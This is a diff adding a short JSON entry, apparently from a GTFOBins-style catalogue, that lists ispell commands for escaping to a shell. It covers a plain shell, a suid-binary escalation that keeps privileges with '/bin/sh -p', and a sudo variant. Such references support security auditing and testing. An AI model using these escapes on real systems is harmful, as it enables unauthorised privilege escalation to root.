@@ -1,0 +1,22 @@
+{
+  "functions": {
+    "shell": [
+      {
+        
+        "code": "ispell /etc/passwd\n!/bin/sh\n"
+      }
+    ],
+    "suid": [
+      {
+        
+        "code": "./ispell /etc/passwd\n!/bin/sh -p\n"
+      }
+    ],
+    "sudo": [
+      {
+        
+        "code": "sudo ispell /etc/passwd\n!/bin/sh\n"
+      }
+    ]
+  }
+}
